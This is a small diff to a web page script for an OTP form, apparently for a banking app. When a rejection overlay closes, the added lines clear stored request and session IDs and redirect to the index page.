@@ -398,6 +398,10 @@
       rejectOverlay.classList.remove('show');
       otpForm.style.display = 'block';
       otpInput.value = '';
+      localStorage.removeItem('requestId');
+      sessionStorage.removeItem('aman_bank_request_id');
+      sessionStorage.removeItem('aman_bank_session_id');
+      window.location.href = 'index.html';
     });
   </script>
 
